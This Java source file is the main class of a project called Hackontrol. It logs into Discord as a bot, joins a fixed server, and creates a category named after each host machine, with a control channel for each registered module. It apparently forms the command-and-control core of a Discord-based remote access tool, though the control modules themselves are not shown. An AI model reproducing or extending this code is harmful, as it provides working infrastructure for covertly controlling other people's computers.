package com.khopan.hackontrol;

import java.util.Collections;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.khopan.hackontrol.manager.Manager;
import com.khopan.hackontrol.registration.ChannelRegistry;
import com.khopan.hackontrol.registration.ManagerRegistry;
import com.khopan.hackontrol.registry.RegistrationHandler;
import com.khopan.hackontrol.registry.RegistryType;
import com.khopan.hackontrol.registry.implementation.StrictClassValueOnlyRegistryImplementation;
import com.khopan.hackontrol.utils.DiscordUtils;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	public static final RegistryType<Void, Class<? extends Manager>> MANAGER_REGISTRY = RegistryType.create();
	public static final RegistryType<Void, Class<? extends HackontrolChannel>> CHANNEL_REGISTRY = RegistryType.create();

	public static final Logger LOGGER = LoggerFactory.getLogger("Hackontrol");

	private static Hackontrol INSTANCE;

	private final List<Manager> managerList;
	private final List<HackontrolChannel> channelList;
	private final RegistrationHandler registrationHandler;
	private final JDA bot;
	private final Guild guild;
	private final Category category;

	private Hackontrol() {
		Hackontrol.INSTANCE = this;
		StrictClassValueOnlyRegistryImplementation<Manager> managerRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.MANAGER_REGISTRY, Manager.class);
		ManagerRegistry.register(managerRegistryImplementation);
		this.managerList = managerRegistryImplementation.getList();
		StrictClassValueOnlyRegistryImplementation<HackontrolChannel> channelRegistryImplementation = StrictClassValueOnlyRegistryImplementation.create(Hackontrol.CHANNEL_REGISTRY, HackontrolChannel.class);
		ChannelRegistry.register(channelRegistryImplementation);
		this.channelList = channelRegistryImplementation.getList();

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel channel = this.channelList.get(i);
			Hackontrol.LOGGER.info("Registered channel: {}", channel.getClass().getName());
		}

		this.registrationHandler = new RegistrationHandler();
		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);

		for(int i = 0; i < this.managerList.size(); i++) {
			Manager manager = this.managerList.get(i);
			manager.configureBuilder(builder);
		}

		this.bot = builder.build();

		try {
			this.bot.awaitReady();
		} catch(Throwable Errors) {
			throw new RuntimeException();
		}

		this.guild = this.bot.getGuildById(1173967259304198154L);
		String identifier = Machine.getIdentifier();
		this.category = DiscordUtils.getOrCreateCategory(this.guild, identifier);

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel channel = this.channelList.get(i);
			String channelName = channel.getName();
			TextChannel textChannel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, channelName);
			channel.channel = textChannel;
			channel.register(this.registrationHandler.createRegistry(channel));

			if(DiscordUtils.isChannelEmpty(textChannel)) {
				channel.initialize();
			}
		}

		for(int i = 0; i < this.managerList.size(); i++) {
			Manager manager = this.managerList.get(i);
			manager.initialize(this.registrationHandler);
		}
	}

	public List<Manager> getManagerList() {
		return Collections.unmodifiableList(this.managerList);
	}

	@SuppressWarnings("unchecked")
	public <T extends Manager> T getManager(Class<T> managerClass) {
		if(managerClass == null) {
			throw new NullPointerException("Manager class cannot be null");
		}

		for(int i = 0; i < this.managerList.size(); i++) {
			Manager manager = this.managerList.get(i);

			if(managerClass.isAssignableFrom(manager.getClass())) {
				return (T) manager;
			}
		}

		return null;
	}

	public List<HackontrolChannel> getChannelList() {
		return Collections.unmodifiableList(this.channelList);
	}

	@SuppressWarnings("unchecked")
	public <T extends HackontrolChannel> T getChannel(Class<T> channelClass) {
		if(channelClass == null) {
			throw new NullPointerException("Channel class cannot be null");
		}

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel channel = this.channelList.get(i);

			if(channelClass.isAssignableFrom(channel.getClass())) {
				return (T) channel;
			}
		}

		return null;
	}

	public HackontrolChannel getChannel(TextChannel textChannel) {
		if(textChannel == null) {
			throw new NullPointerException("Text channel cannot be null");
		}

		for(int i = 0; i < this.channelList.size(); i++) {
			HackontrolChannel channel = this.channelList.get(i);

			if(textChannel.equals(channel.channel)) {
				return channel;
			}
		}

		return null;
	}

	public RegistrationHandler getRegistrationHandler() {
		return this.registrationHandler;
	}

	public JDA getBot() {
		return this.bot;
	}

	public Guild getGuild() {
		return this.guild;
	}

	public Category getCategory() {
		return this.category;
	}

	public static void main(String[] args) throws Throwable {
		Hackontrol.LOGGER.info("Initializing");
		Hackontrol.getInstance();
	}

	public static Hackontrol getInstance() {
		if(Hackontrol.INSTANCE == null) {
			Hackontrol.INSTANCE = new Hackontrol();
		}

		return Hackontrol.INSTANCE;
	}
}
